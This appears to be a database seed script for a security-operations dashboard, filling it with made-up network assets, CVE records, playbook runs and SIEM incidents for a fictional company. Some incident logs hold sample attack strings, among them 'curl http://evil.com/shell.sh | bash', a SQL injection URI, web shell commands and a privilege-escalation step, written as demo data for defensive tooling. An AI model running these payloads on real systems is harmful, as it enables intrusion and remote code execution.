"""Contexta SOC — deterministic database seed script.

Run from the backend directory:
    python -m seeds.seed          # first-time seed
    python -m seeds.seed --force  # drop seed data and re-insert
    python -m seeds.seed --verify-only  # verify ledger chain only
"""

import asyncio
import hashlib
import json
import random
import sys
import uuid
from datetime import datetime, timedelta, timezone

from sqlalchemy import select, func, delete
from sqlalchemy.exc import ProgrammingError

from app.database import async_session_factory
from app.models import (
    Asset,
    CVE,
    Incident,
    SeverityEnum,
    StatusEnum,
    LedgerBlock,
    NetworkTopology,
    PlaybookExecution,
    ExecutionStatusEnum,
)
from app.risk_engine.bwvs import BWVSCalculator
from app.risk_engine.ranking import PriorityRanker

random.seed(42)

bwvs_calc = BWVSCalculator()
priority_ranker = PriorityRanker()

NOW = datetime.now(timezone.utc)


def _compute_hash(prev_hash: str, payload: dict, created_at: datetime) -> str:
    raw = (
        prev_hash
        + json.dumps(payload, sort_keys=True, default=str)
        + created_at.isoformat()
    )
    return hashlib.sha256(raw.encode()).hexdigest()


# ── 1. Topology ─────────────────────────────────────────────────────────────

TOPOLOGY_NODES = [
    {"id": "dmz-01", "label": "DMZ Gateway", "node_type": "dmz", "ip_address": "203.0.113.1", "criticality": 6, "is_internet_facing": True, "services": ["HTTP:80", "HTTPS:443"]},
    {"id": "fw-01", "label": "Perimeter Firewall", "node_type": "firewall", "ip_address": "192.168.0.1", "criticality": 9, "is_internet_facing": False, "services": ["iptables", "pf"]},
    {"id": "web-01", "label": "Web Server Alpha", "node_type": "web_server", "ip_address": "192.168.1.10", "criticality": 7, "is_internet_facing": False, "services": ["nginx:443", "nodejs:3000"]},
    {"id": "web-02", "label": "Web Server Beta", "node_type": "web_server", "ip_address": "192.168.1.11", "criticality": 7, "is_internet_facing": False, "services": ["nginx:443", "nodejs:3000"]},
    {"id": "app-01", "label": "Application Server", "node_type": "app_server", "ip_address": "192.168.2.10", "criticality": 8, "is_internet_facing": False, "services": ["python:8000", "redis:6379"]},
    {"id": "app-02", "label": "API Gateway", "node_type": "app_server", "ip_address": "192.168.2.11", "criticality": 8, "is_internet_facing": False, "services": ["fastapi:8001", "nginx:80"]},
    {"id": "db-01", "label": "Primary PostgreSQL", "node_type": "database", "ip_address": "192.168.3.10", "criticality": 10, "is_internet_facing": False, "services": ["postgresql:5432"]},
    {"id": "db-02", "label": "Analytics Database", "node_type": "database", "ip_address": "192.168.3.11", "criticality": 9, "is_internet_facing": False, "services": ["postgresql:5433", "metabase:3000"]},
    {"id": "dc-01", "label": "Domain Controller", "node_type": "domain_controller", "ip_address": "192.168.4.10", "criticality": 10, "is_internet_facing": False, "services": ["ldap:389", "kerberos:88", "dns:53"]},
    {"id": "file-01", "label": "File Server", "node_type": "file_server", "ip_address": "192.168.5.10", "criticality": 7, "is_internet_facing": False, "services": ["smb:445", "nfs:2049"]},
    {"id": "backup-01", "label": "Backup Server", "node_type": "backup_server", "ip_address": "192.168.6.10", "criticality": 8, "is_internet_facing": False, "services": ["rsync:873", "ssh:22"]},
    {"id": "ws-01", "label": "HR Workstation", "node_type": "workstation", "ip_address": "192.168.10.50", "criticality": 4, "is_internet_facing": False, "services": ["rdp:3389", "ssh:22"]},
]

TOPOLOGY_EDGES = [
    {"source": "dmz-01", "target": "fw-01", "weight": 1.0},
    {"source": "fw-01", "target": "web-01", "weight": 1.0},
    {"source": "fw-01", "target": "web-02", "weight": 1.0},
    {"source": "web-01", "target": "app-01", "weight": 1.2},
    {"source": "web-02", "target": "app-01", "weight": 1.2},
    {"source": "app-01", "target": "app-02", "weight": 1.0},
    {"source": "app-01", "target": "db-01", "weight": 1.5},
    {"source": "app-02", "target": "db-01", "weight": 1.5},
    {"source": "app-02", "target": "db-02", "weight": 1.3},
    {"source": "app-01", "target": "file-01", "weight": 1.4},
    {"source": "dc-01", "target": "file-01", "weight": 1.0},
    {"source": "dc-01", "target": "backup-01", "weight": 1.0},
    {"source": "db-01", "target": "backup-01", "weight": 1.2},
    {"source": "ws-01", "target": "app-01", "weight": 2.0},
    {"source": "ws-01", "target": "file-01", "weight": 1.8},
]


# ── 2. Assets ────────────────────────────────────────────────────────────────

ASSETS_DATA = [
    {"name": "DMZ Gateway", "asset_type": "dmz", "ip_address": "203.0.113.1", "subnet": "203.0.113.0/24", "criticality": 6, "business_unit": "Network Infrastructure", "owner": "network-ops@horizoncorp.com", "is_internet_facing": True, "tags": {"environment": "production", "tier": "perimeter", "compliance": ["PCI-DSS"]}},
    {"name": "Perimeter Firewall", "asset_type": "firewall", "ip_address": "192.168.0.1", "subnet": "192.168.0.0/24", "criticality": 9, "business_unit": "Network Infrastructure", "owner": "network-ops@horizoncorp.com", "is_internet_facing": False, "tags": {"environment": "production", "tier": "perimeter", "vendor": "Palo Alto", "compliance": ["PCI-DSS", "ISO27001"]}},
    {"name": "Web Server Alpha", "asset_type": "web_server", "ip_address": "192.168.1.10", "subnet": "192.168.1.0/24", "criticality": 7, "business_unit": "Engineering", "owner": "engineering@horizoncorp.com", "is_internet_facing": False, "tags": {"environment": "production", "tier": "web", "language": "nodejs", "compliance": ["PCI-DSS"]}},
    {"name": "Web Server Beta", "asset_type": "web_server", "ip_address": "192.168.1.11", "subnet": "192.168.1.0/24", "criticality": 7, "business_unit": "Engineering", "owner": "engineering@horizoncorp.com", "is_internet_facing": False, "tags": {"environment": "production", "tier": "web", "language": "nodejs", "compliance": ["PCI-DSS"]}},
    {"name": "Application Server", "asset_type": "app_server", "ip_address": "192.168.2.10", "subnet": "192.168.2.0/24", "criticality": 8, "business_unit": "Engineering", "owner": "engineering@horizoncorp.com", "is_internet_facing": False, "tags": {"environment": "production", "tier": "application", "framework": "fastapi", "compliance": ["PCI-DSS", "SOC2"]}},
    {"name": "API Gateway", "asset_type": "app_server", "ip_address": "192.168.2.11", "subnet": "192.168.2.0/24", "criticality": 8, "business_unit": "Engineering", "owner": "engineering@horizoncorp.com", "is_internet_facing": False, "tags": {"environment": "production", "tier": "application", "compliance": ["PCI-DSS", "SOC2"]}},
    {"name": "Primary PostgreSQL", "asset_type": "database", "ip_address": "192.168.3.10", "subnet": "192.168.3.0/24", "criticality": 10, "business_unit": "Data", "owner": "data-team@horizoncorp.com", "is_internet_facing": False, "tags": {"environment": "production", "tier": "data", "data_classification": "restricted", "contains_pii": True, "compliance": ["GDPR", "PCI-DSS", "HIPAA", "SOC2"]}},
    {"name": "Analytics Database", "asset_type": "database", "ip_address": "192.168.3.11", "subnet": "192.168.3.0/24", "criticality": 9, "business_unit": "Data", "owner": "data-team@horizoncorp.com", "is_internet_facing": False, "tags": {"environment": "production", "tier": "data", "data_classification": "confidential", "contains_pii": True, "compliance": ["GDPR", "SOC2"]}},
    {"name": "Domain Controller", "asset_type": "domain_controller", "ip_address": "192.168.4.10", "subnet": "192.168.4.0/24", "criticality": 10, "business_unit": "IT Operations", "owner": "it-ops@horizoncorp.com", "is_internet_facing": False, "tags": {"environment": "production", "tier": "identity", "vendor": "Microsoft", "compliance": ["ISO27001", "SOC2"]}},
    {"name": "File Server", "asset_type": "file_server", "ip_address": "192.168.5.10", "subnet": "192.168.5.0/24", "criticality": 7, "business_unit": "IT Operations", "owner": "it-ops@horizoncorp.com", "is_internet_facing": False, "tags": {"environment": "production", "tier": "storage", "data_classification": "confidential", "compliance": ["GDPR", "ISO27001"]}},
    {"name": "Backup Server", "asset_type": "backup_server", "ip_address": "192.168.6.10", "subnet": "192.168.6.0/24", "criticality": 8, "business_unit": "IT Operations", "owner": "it-ops@horizoncorp.com", "is_internet_facing": False, "tags": {"environment": "production", "tier": "storage", "backup_frequency": "daily", "compliance": ["ISO27001", "SOC2"]}},
    {"name": "HR Workstation", "asset_type": "workstation", "ip_address": "192.168.10.50", "subnet": "192.168.10.0/24", "criticality": 4, "business_unit": "Human Resources", "owner": "hr@horizoncorp.com", "is_internet_facing": False, "tags": {"environment": "production", "tier": "endpoint", "department": "HR", "compliance": ["GDPR"]}},
]


# ── 3. Incidents ─────────────────────────────────────────────────────────────

def _ago(days=0, hours=0):
    return NOW - timedelta(days=days, hours=hours)


INCIDENTS_DATA = [
    {"title": "SQL injection attempt on Web Server Alpha", "severity": SeverityEnum.critical, "status": StatusEnum.resolved, "source": "siem", "asset_name": "Web Server Alpha", "created_at": _ago(days=28), "raw_log": {"src_ip": "45.33.32.156", "dst_ip": "192.168.1.10", "dst_port": 443, "method": "POST", "uri": "/api/users?id=1 OR 1=1--", "user_agent": "sqlmap/1.7", "bytes_sent": 1240, "response_code": 500, "alert_rule": "SQL_INJECTION_DETECTED"}},
    {"title": "Brute force attack against Domain Controller", "severity": SeverityEnum.high, "status": StatusEnum.resolved, "source": "siem", "asset_name": "Domain Controller", "created_at": _ago(days=26), "raw_log": {"src_ip": "198.51.100.42", "dst_ip": "192.168.4.10", "dst_port": 88, "protocol": "kerberos", "failed_attempts": 847, "timespan_seconds": 300, "targeted_accounts": ["administrator", "admin", "svc_backup"], "alert_rule": "BRUTE_FORCE_KERBEROS"}},
    {"title": "Unauthorized data export from Analytics Database", "severity": SeverityEnum.critical, "status": StatusEnum.investigating, "source": "siem", "asset_name": "Analytics Database", "created_at": _ago(days=24), "raw_log": {"src_ip": "192.168.2.10", "dst_ip": "192.168.3.11", "dst_port": 5433, "query": "SELECT * FROM customer_profiles LIMIT 500000", "rows_returned": 498234, "duration_ms": 12400, "user": "app_readonly", "alert_rule": "MASS_DATA_EXPORT"}},
    {"title": "Lateral movement detected from HR Workstation", "severity": SeverityEnum.high, "status": StatusEnum.contained, "source": "siem", "asset_name": "HR Workstation", "created_at": _ago(days=22), "raw_log": {"src_ip": "192.168.10.50", "events": [{"dst": "192.168.2.10", "port": 8000, "protocol": "http"}, {"dst": "192.168.5.10", "port": 445, "protocol": "smb"}, {"dst": "192.168.4.10", "port": 389, "protocol": "ldap"}], "time_window_minutes": 8, "alert_rule": "LATERAL_MOVEMENT_PATTERN"}},
    {"title": "Ransomware precursor activity on File Server", "severity": SeverityEnum.critical, "status": StatusEnum.resolved, "source": "siem", "asset_name": "File Server", "created_at": _ago(days=20), "raw_log": {"src_ip": "192.168.10.50", "dst_ip": "192.168.5.10", "actions": ["enumerate_shares", "recursive_read", "create_ransom_note.txt"], "files_accessed": 12847, "alert_rule": "RANSOMWARE_PRECURSOR", "vssadmin_delete": True}},
    {"title": "Suspicious outbound traffic from Application Server", "severity": SeverityEnum.medium, "status": StatusEnum.resolved, "source": "siem", "asset_name": "Application Server", "created_at": _ago(days=18), "raw_log": {"src_ip": "192.168.2.10", "dst_ip": "185.220.101.34", "dst_port": 4444, "protocol": "tcp", "bytes_out": 48200, "connection_duration_s": 3600, "geo_country": "RU", "alert_rule": "C2_BEACON_SUSPECTED"}},
    {"title": "CVE-2024-3400 exploit attempt on Perimeter Firewall", "severity": SeverityEnum.critical, "status": StatusEnum.resolved, "source": "cve_feed", "asset_name": "Perimeter Firewall", "created_at": _ago(days=16), "raw_log": {"cve_id": "CVE-2024-3400", "src_ip": "104.21.45.67", "dst_ip": "192.168.0.1", "exploit_payload": "curl http://evil.com/shell.sh | bash", "vulnerability": "PAN-OS command injection", "alert_rule": "KNOWN_CVE_EXPLOIT"}},
    {"title": "Privilege escalation on Application Server", "severity": SeverityEnum.high, "status": StatusEnum.investigating, "source": "siem", "asset_name": "Application Server", "created_at": _ago(days=14), "raw_log": {"host": "192.168.2.10", "user": "www-data", "command": "sudo -l", "followed_by": "sudo bash", "uid_before": 33, "uid_after": 0, "tty": "/dev/pts/1", "alert_rule": "PRIVILEGE_ESCALATION"}},
    {"title": "Credential stuffing attack on Web Server Beta", "severity": SeverityEnum.medium, "status": StatusEnum.resolved, "source": "siem", "asset_name": "Web Server Beta", "created_at": _ago(days=12), "raw_log": {"src_ips": ["91.108.4.0", "91.108.56.0", "149.154.160.0"], "dst_ip": "192.168.1.11", "endpoint": "/api/auth/login", "attempts": 15420, "successful": 3, "timespan_minutes": 45, "alert_rule": "CREDENTIAL_STUFFING"}},
    {"title": "Backup exfiltration via SMB on Backup Server", "severity": SeverityEnum.high, "status": StatusEnum.open, "source": "siem", "asset_name": "Backup Server", "created_at": _ago(days=10), "raw_log": {"src_ip": "192.168.4.10", "dst_ip": "192.168.6.10", "protocol": "smb", "share": "BACKUPS$", "files_copied": ["db_backup_2024.tar.gz", "config_backup.zip"], "dst_external": "203.0.113.99", "bytes_exfiltrated": 8589934592, "alert_rule": "DATA_EXFILTRATION_SMB"}},
    {"title": "DNS tunneling detected from Domain Controller", "severity": SeverityEnum.high, "status": StatusEnum.investigating, "source": "siem", "asset_name": "Domain Controller", "created_at": _ago(days=8), "raw_log": {"src_ip": "192.168.4.10", "queries_per_minute": 840, "avg_query_length": 187, "unique_subdomains": 4200, "apex_domain": "c2tunnel.net", "entropy_score": 4.7, "alert_rule": "DNS_TUNNELING_HIGH_ENTROPY"}},
    {"title": "Zero-day exploit attempt on API Gateway", "severity": SeverityEnum.critical, "status": StatusEnum.open, "source": "siem", "asset_name": "API Gateway", "created_at": _ago(days=6), "raw_log": {"src_ip": "45.142.212.100", "dst_ip": "192.168.2.11", "payload_size": 4096, "anomaly": "heap_overflow_pattern", "signature": "NONE_MATCHED", "heuristic_score": 0.94, "alert_rule": "ZERO_DAY_HEURISTIC"}},
    {"title": "Insider threat — mass file download by HR user", "severity": SeverityEnum.medium, "status": StatusEnum.investigating, "source": "siem", "asset_name": "HR Workstation", "created_at": _ago(days=5), "raw_log": {"user": "jsmith@horizoncorp.com", "src_ip": "192.168.10.50", "dst": "personal_usb_drive", "files_downloaded": 3241, "data_types": ["employee_records", "salary_data", "contracts"], "time": "23:47:00", "alert_rule": "INSIDER_THREAT_MASS_DOWNLOAD"}},
    {"title": "Malicious Docker image deployed on Application Server", "severity": SeverityEnum.high, "status": StatusEnum.open, "source": "siem", "asset_name": "Application Server", "created_at": _ago(days=4), "raw_log": {"host": "192.168.2.10", "image": "python:3.11-alpine-modified", "image_hash": "sha256:deadbeef1234", "registry": "hub.docker.com.malicious.site", "capabilities": ["CAP_SYS_ADMIN", "CAP_NET_ADMIN"], "alert_rule": "MALICIOUS_CONTAINER_IMAGE"}},
    {"title": "PostgreSQL remote code execution attempt", "severity": SeverityEnum.critical, "status": StatusEnum.open, "source": "cve_feed", "asset_name": "Primary PostgreSQL", "created_at": _ago(days=3), "raw_log": {"cve_id": "CVE-2024-7348", "src_ip": "192.168.2.10", "dst_ip": "192.168.3.10", "dst_port": 5432, "payload": "CREATE EXTENSION IF NOT EXISTS pg_execute_server_program", "user": "app_user", "alert_rule": "POSTGRES_RCE_ATTEMPT"}},
    {"title": "Phishing link clicked — credential compromise suspected", "severity": SeverityEnum.medium, "status": StatusEnum.open, "source": "manual", "asset_name": "HR Workstation", "created_at": _ago(days=2), "raw_log": {"user": "ajohansson@horizoncorp.com", "email_subject": "Urgent: Review Q4 Payroll", "link_clicked": "http://horizoncorp-portal.phishing.io/login", "browser": "Chrome 120", "session_token_exposed": True, "alert_rule": "PHISHING_CREDENTIAL_HARVEST"}},
    {"title": "Web shell uploaded to Web Server Alpha", "severity": SeverityEnum.critical, "status": StatusEnum.open, "source": "siem", "asset_name": "Web Server Alpha", "created_at": _ago(days=2, hours=1), "raw_log": {"src_ip": "45.33.32.156", "dst_ip": "192.168.1.10", "upload_path": "/var/www/html/uploads/shell.php", "file_content_hash": "sha256:aabbcc1234", "post_upload_requests": ["/uploads/shell.php?cmd=id", "/uploads/shell.php?cmd=whoami"], "alert_rule": "WEBSHELL_DETECTED"}},
    {"title": "Unusual Kerberos ticket requests — pass-the-ticket suspected", "severity": SeverityEnum.high, "status": StatusEnum.open, "source": "siem", "asset_name": "Domain Controller", "created_at": _ago(days=1), "raw_log": {"src_ip": "192.168.2.10", "dst_ip": "192.168.4.10", "ticket_type": "TGS", "service_principal": "cifs/file-01.horizoncorp.local", "anomaly": "ticket_requested_outside_normal_hours", "hour": 3, "alert_rule": "PASS_THE_TICKET_SUSPECTED"}},
    {"title": "Crypto mining process detected on API Gateway", "severity": SeverityEnum.low, "status": StatusEnum.resolved, "source": "siem", "asset_name": "API Gateway", "created_at": _ago(hours=12), "raw_log": {"host": "192.168.2.11", "process": "xmrig", "pid": 31337, "cpu_usage_pct": 98, "network_dst": "pool.minexmr.com:4444", "persistence": "/etc/cron.d/update-check", "alert_rule": "CRYPTOMINER_DETECTED"}},
    {"title": "Mass authentication failure — potential domain compromise", "severity": SeverityEnum.critical, "status": StatusEnum.open, "source": "siem", "asset_name": "Domain Controller", "created_at": _ago(hours=1), "raw_log": {"dst_ip": "192.168.4.10", "failed_auth_count": 12400, "unique_src_ips": 3, "accounts_targeted": 847, "lockout_threshold_hit": True, "suspected_technique": "password_spray", "alert_rule": "DOMAIN_COMPROMISE_SUSPECTED"}},
]


# ── 4. CVEs ──────────────────────────────────────────────────────────────────

CVES_DATA = [
    {"id": "CVE-2024-3400", "cvss_score": 10.0, "epss_score": 0.97, "is_kev": True, "exploit_maturity": "weaponised", "business_impact": 9.5, "published_days_ago": 45, "description": "PAN-OS GlobalProtect OS command injection — unauthenticated RCE", "affected_products": [{"vendor": "Palo Alto Networks", "product": "PAN-OS", "versions": ["<11.1.2-h3", "<11.0.4-h1"]}], "cwe_ids": ["CWE-78"], "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"},
    {"id": "CVE-2024-21762", "cvss_score": 9.8, "epss_score": 0.94, "is_kev": True, "exploit_maturity": "weaponised", "business_impact": 9.0, "published_days_ago": 38, "description": "Fortinet FortiOS out-of-bounds write — unauthenticated RCE via SSL VPN", "affected_products": [{"vendor": "Fortinet", "product": "FortiOS", "versions": ["<7.4.2", "<7.2.6"]}], "cwe_ids": ["CWE-787"], "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    {"id": "CVE-2024-7348", "cvss_score": 9.8, "epss_score": 0.72, "is_kev": False, "exploit_maturity": "functional", "business_impact": 8.5, "published_days_ago": 22, "description": "PostgreSQL pg_dump privilege escalation — arbitrary code execution", "affected_products": [{"vendor": "PostgreSQL", "product": "PostgreSQL", "versions": ["<16.4", "<15.8"]}], "cwe_ids": ["CWE-362"], "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    {"id": "CVE-2024-6387", "cvss_score": 8.1, "epss_score": 0.68, "is_kev": False, "exploit_maturity": "functional", "business_impact": 8.0, "published_days_ago": 30, "description": "OpenSSH regreSSHion — unauthenticated RCE in sshd", "affected_products": [{"vendor": "OpenBSD", "product": "OpenSSH", "versions": ["<9.8"]}], "cwe_ids": ["CWE-362", "CWE-364"], "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    {"id": "CVE-2024-4577", "cvss_score": 9.8, "epss_score": 0.91, "is_kev": True, "exploit_maturity": "weaponised", "business_impact": 9.0, "published_days_ago": 55, "description": "PHP CGI argument injection — RCE on Windows servers", "affected_products": [{"vendor": "PHP", "product": "PHP", "versions": ["<8.3.8", "<8.2.20", "<8.1.29"]}], "cwe_ids": ["CWE-78"], "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    {"id": "CVE-2024-1709", "cvss_score": 10.0, "epss_score": 0.96, "is_kev": True, "exploit_maturity": "weaponised", "business_impact": 9.8, "published_days_ago": 60, "description": "ConnectWise ScreenConnect authentication bypass", "affected_products": [{"vendor": "ConnectWise", "product": "ScreenConnect", "versions": ["<23.9.8"]}], "cwe_ids": ["CWE-288"], "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"},
    {"id": "CVE-2024-27198", "cvss_score": 9.8, "epss_score": 0.88, "is_kev": True, "exploit_maturity": "weaponised", "business_impact": 8.5, "published_days_ago": 42, "description": "JetBrains TeamCity authentication bypass — full server takeover", "affected_products": [{"vendor": "JetBrains", "product": "TeamCity", "versions": ["<2023.11.4"]}], "cwe_ids": ["CWE-288"], "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    {"id": "CVE-2024-23897", "cvss_score": 9.8, "epss_score": 0.85, "is_kev": True, "exploit_maturity": "weaponised", "business_impact": 8.0, "published_days_ago": 48, "description": "Jenkins arbitrary file read via CLI — leads to RCE", "affected_products": [{"vendor": "Jenkins", "product": "Jenkins", "versions": ["<2.442", "<LTS 2.426.3"]}], "cwe_ids": ["CWE-22"], "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    {"id": "CVE-2024-22024", "cvss_score": 8.3, "epss_score": 0.61, "is_kev": False, "exploit_maturity": "functional", "business_impact": 7.5, "published_days_ago": 35, "description": "Ivanti Connect Secure XML external entity — authentication bypass", "affected_products": [{"vendor": "Ivanti", "product": "Connect Secure", "versions": ["<22.4R2.3"]}], "cwe_ids": ["CWE-611"], "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L"},
    {"id": "CVE-2023-46805", "cvss_score": 8.2, "epss_score": 0.79, "is_kev": True, "exploit_maturity": "weaponised", "business_impact": 8.0, "published_days_ago": 90, "description": "Ivanti ICS authentication bypass — exploited in nation-state attacks", "affected_products": [{"vendor": "Ivanti", "product": "Connect Secure", "versions": ["<9.1R14.5", "<9.1R17.3"]}], "cwe_ids": ["CWE-287"], "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"},
    {"id": "CVE-2024-30078", "cvss_score": 8.8, "epss_score": 0.55, "is_kev": False, "exploit_maturity": "proof-of-concept", "business_impact": 7.0, "published_days_ago": 28, "description": "Windows WiFi driver RCE — no user interaction required", "affected_products": [{"vendor": "Microsoft", "product": "Windows", "versions": ["10", "11", "Server 2022"]}], "cwe_ids": ["CWE-122"], "cvss_vector": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    {"id": "CVE-2024-38063", "cvss_score": 9.8, "epss_score": 0.42, "is_kev": False, "exploit_maturity": "proof-of-concept", "business_impact": 7.5, "published_days_ago": 20, "description": "Windows TCP/IP IPv6 RCE — wormable, no authentication", "affected_products": [{"vendor": "Microsoft", "product": "Windows", "versions": ["10", "11", "Server 2019", "Server 2022"]}], "cwe_ids": ["CWE-191"], "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    {"id": "CVE-2024-26169", "cvss_score": 7.8, "epss_score": 0.38, "is_kev": False, "exploit_maturity": "proof-of-concept", "business_impact": 6.5, "published_days_ago": 32, "description": "Windows Error Reporting local privilege escalation", "affected_products": [{"vendor": "Microsoft", "product": "Windows", "versions": ["10", "11", "Server 2019", "Server 2022"]}], "cwe_ids": ["CWE-269"], "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"},
    {"id": "CVE-2024-20359", "cvss_score": 6.0, "epss_score": 0.22, "is_kev": False, "exploit_maturity": "unknown", "business_impact": 5.0, "published_days_ago": 70, "description": "Cisco ASA persistent local code execution — requires prior auth", "affected_products": [{"vendor": "Cisco", "product": "ASA", "versions": ["<9.16.4.57"]}], "cwe_ids": ["CWE-94"], "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N"},
    {"id": "CVE-2023-20198", "cvss_score": 10.0, "epss_score": 0.98, "is_kev": True, "exploit_maturity": "weaponised", "business_impact": 10.0, "published_days_ago": 120, "description": "Cisco IOS XE web UI privilege escalation — mass exploitation campaign", "affected_products": [{"vendor": "Cisco", "product": "IOS XE", "versions": ["<17.9.4a", "<17.6.6a"]}], "cwe_ids": ["CWE-420"], "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"},
]


# ── Seed functions ───────────────────────────────────────────────────────────

async def seed_topology(session):
    topo_id = str(uuid.uuid4())
    topo = NetworkTopology(
        id=topo_id,
        name="Horizon Corp Primary Network",
        description="Primary corporate network topology with 12 nodes and 15 edges",
        nodes=TOPOLOGY_NODES,
        edges=TOPOLOGY_EDGES,
        is_active=True,
    )
    session.add(topo)
    await session.flush()
    print("[+] Seeded 1 network topology")
    return topo


async def seed_assets(session):
    assets = {}
    for ad in ASSETS_DATA:
        asset = Asset(
            id=str(uuid.uuid4()),
            name=ad["name"],
            asset_type=ad["asset_type"],
            ip_address=ad["ip_address"],
            subnet=ad["subnet"],
            criticality=ad["criticality"],
            business_unit=ad["business_unit"],
            owner=ad["owner"],
            is_internet_facing=ad["is_internet_facing"],
            tags=ad["tags"],
        )
        session.add(asset)
        assets[ad["name"]] = asset
    await session.flush()
    print(f"[+] Seeded {len(assets)} assets")
    return assets


async def seed_incidents(session, assets):
    incidents = []
    for idx, idata in enumerate(INCIDENTS_DATA):
        asset = assets.get(idata["asset_name"])
        inc = Incident(
            id=str(uuid.uuid4()),
            title=idata["title"],
            severity=idata["severity"],
            status=idata["status"],
            source=idata["source"],
            raw_log=idata["raw_log"],
            asset_id=asset.id if asset else None,
        )
        inc.created_at = idata["created_at"]
        if idata["status"] == StatusEnum.resolved:
            inc.closed_at = idata["created_at"] + timedelta(hours=random.randint(2, 48))
        session.add(inc)
        incidents.append(inc)
    await session.flush()
    print(f"[+] Seeded {len(incidents)} incidents")
    return incidents


async def seed_cves(session):
    cves = []
    for cd in CVES_DATA:
        published = NOW - timedelta(days=cd["published_days_ago"])
        modified = published + timedelta(days=random.randint(1, 5))
        exploit_available = cd["exploit_maturity"] in ("weaponised", "functional")

        result = bwvs_calc.calculate(
            cvss_score=cd["cvss_score"],
            exploit_maturity=cd["exploit_maturity"],
            exposure="internal",
            asset_criticality=5,
            business_impact=cd["business_impact"],
        )
        bwvs_score = result["bwvs_score"]
        priority_rank = priority_ranker.calculate_priority(
            bwvs_score=bwvs_score,
            published_date=published,
            epss_score=cd["epss_score"],
        )

        cve = CVE(
            id=cd["id"],
            description=cd["description"],
            cvss_score=cd["cvss_score"],
            cvss_vector=cd["cvss_vector"],
            epss_score=cd["epss_score"],
            is_kev=cd["is_kev"],
            published_date=published,
            modified_date=modified,
            affected_products=cd["affected_products"],
            cwe_ids=cd["cwe_ids"],
            exploit_available=exploit_available,
            exploit_maturity=cd["exploit_maturity"],
            bwvs_score=bwvs_score,
            priority_rank=priority_rank,
        )
        session.add(cve)
        cves.append(cve)
    await session.flush()
    print(f"[+] Seeded {len(cves)} CVEs")
    return cves


async def seed_playbook_executions(session, incidents):
    inc_by_idx = {i: inc for i, inc in enumerate(incidents)}

    executions_data = [
        {
            "playbook_id": "ransomware_response",
            "incident_idx": 4,
            "status": ExecutionStatusEnum.completed,
            "current_step": 5,
            "started_at": _ago(days=20),
            "completed_at": _ago(days=19, hours=-6),
            "step_results": [
                {"step_id": 1, "name": "Isolate affected systems", "status": "completed", "result": "File server isolated from network at VLAN level", "completed_at": (_ago(days=20) + timedelta(minutes=5)).isoformat()},
                {"step_id": 2, "name": "Collect memory dump", "status": "completed", "result": "Full memory dump captured — 32 GB written to forensics share", "completed_at": (_ago(days=20) + timedelta(minutes=25)).isoformat()},
                {"step_id": 3, "name": "Analyse artifacts", "status": "completed", "result": "Identified precursor script in /tmp/.cache — IOCs extracted", "completed_at": (_ago(days=20) + timedelta(hours=2)).isoformat()},
                {"step_id": 4, "name": "Remediate and clean", "status": "completed", "result": "Malicious files removed, AV signatures updated cluster-wide", "completed_at": (_ago(days=20) + timedelta(hours=4)).isoformat()},
                {"step_id": 5, "name": "Verify and restore", "status": "completed", "result": "Service restored from backup, integrity checks passed", "completed_at": (_ago(days=19, hours=-6)).isoformat()},
            ],
        },
        {
            "playbook_id": "lateral_movement",
            "incident_idx": 3,
            "status": ExecutionStatusEnum.completed,
            "current_step": 4,
            "started_at": _ago(days=22),
            "completed_at": _ago(days=21, hours=-2),
            "step_results": [
                {"step_id": 1, "name": "Block source IP", "status": "completed", "result": "192.168.10.50 blocked at firewall layer", "completed_at": (_ago(days=22) + timedelta(minutes=3)).isoformat()},
                {"step_id": 2, "name": "Revoke active sessions", "status": "completed", "result": "All active sessions for HR workstation user revoked", "completed_at": (_ago(days=22) + timedelta(minutes=10)).isoformat()},
                {"step_id": 3, "name": "Audit access logs", "status": "completed", "result": "Lateral access to 3 systems confirmed — no data exfiltration detected", "completed_at": (_ago(days=22) + timedelta(hours=1)).isoformat()},
                {"step_id": 4, "name": "Reset compromised credentials", "status": "completed", "result": "AD password reset forced for affected user, MFA re-enrolled", "completed_at": (_ago(days=21, hours=-2)).isoformat()},
            ],
        },
        {
            "playbook_id": "data_exfiltration",
            "incident_idx": 9,
            "status": ExecutionStatusEnum.running,
            "current_step": 2,
            "started_at": _ago(days=10),
            "completed_at": None,
            "step_results": [
                {"step_id": 1, "name": "Identify exfiltrated data", "status": "completed", "result": "8 GB of backup archives copied to external IP 203.0.113.99", "completed_at": (_ago(days=10) + timedelta(minutes=30)).isoformat()},
                {"step_id": 2, "name": "Notify data protection officer", "status": "completed", "result": "DPO notified — GDPR breach notification clock started", "completed_at": (_ago(days=10) + timedelta(hours=1)).isoformat()},
                {"step_id": 3, "name": "Isolate affected system", "status": "in_progress", "result": "Awaiting change approval for backup server isolation"},
            ],
        },
        {
            "playbook_id": "ransomware_response",
            "incident_idx": 16,
            "status": ExecutionStatusEnum.escalated,
            "current_step": 2,
            "started_at": _ago(days=2),
            "completed_at": None,
            "step_results": [
                {"step_id": 1, "name": "Isolate affected systems", "status": "completed", "result": "Web Server Alpha isolated from DMZ", "completed_at": (_ago(days=2) + timedelta(minutes=8)).isoformat()},
